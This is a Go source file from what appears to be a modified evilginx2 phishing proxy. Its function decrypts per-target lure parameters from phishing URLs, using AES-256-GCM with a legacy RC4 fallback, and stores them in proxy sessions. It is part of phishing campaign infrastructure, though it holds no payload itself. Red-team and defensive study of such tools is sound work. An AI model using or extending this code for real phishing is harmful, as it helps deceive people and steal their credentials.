// lure URL parameter extraction (AES-256-GCM + legacy RC4).
package core

import (
	"crypto/rc4"
	"encoding/base64"
	"net/url"

	"github.com/kgretzky/evilginx2/log"
)

func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	var ret bool = false
	vals := u.Query()
	// the gate token is not a lure param: feeding it into the parsers made
	// lure hits depend on the random token accidentally passing the legacy
	// CRC check (deterministic per token — some lures "worked", others got
	// treated as corrupted URLs)
	vals.Del("t")

	// AES-256-GCM lure params (server-side key, not embedded in URL)
	for _, v := range vals {
		if dec_params, ok := DecryptLureParams(p.cfg.LureKey(), v[0]); ok {
			params, err := url.ParseQuery(dec_params)
			if err == nil {
				for kk, vv := range params {
					log.Info("param(aes): %s='%s'", kk, vv[0])
					session.Params[kk] = vv[0]
				}
				return true
			}
		}
	}

	var enc_key string

	for _, v := range vals {
		if len(v[0]) > 8 {
			enc_key = v[0][:8]
			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
			if err == nil {
				dec_params := make([]byte, len(enc_vals)-1)

				var crc byte = enc_vals[0]
				c, _ := rc4.NewCipher([]byte(enc_key))
				c.XORKeyStream(dec_params, enc_vals[1:])

				var crc_chk byte
				for _, c := range dec_params {
					crc_chk += byte(c)
				}

				if crc == crc_chk {
					params, err := url.ParseQuery(string(dec_params))
					if err == nil {
						for kk, vv := range params {
							log.Debug("param: %s='%s'", kk, vv[0])

							session.Params[kk] = vv[0]
						}
						ret = true
						break
					}
				} else {
					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
				}
			} else {
				log.Debug("extractParams: %s", err)
			}
		}
	}
	/*
		for k, v := range vals {
			if len(k) == 2 {
				// possible rc4 encryption key
				if len(v[0]) == 8 {
					enc_key = v[0]
					break
				}
			}
		}

		if len(enc_key) > 0 {
			for k, v := range vals {
				if len(k) == 3 {
					enc_vals, err := base64.RawURLEncoding.DecodeString(v[0])
					if err == nil {
						dec_params := make([]byte, len(enc_vals))

						c, _ := rc4.NewCipher([]byte(enc_key))
						c.XORKeyStream(dec_params, enc_vals)

						params, err := url.ParseQuery(string(dec_params))
						if err == nil {
							for kk, vv := range params {
								log.Debug("param: %s='%s'", kk, vv[0])

								session.Params[kk] = vv[0]
							}
							ret = true
							break
						}
					}
				}
			}
		}*/
	return ret
}
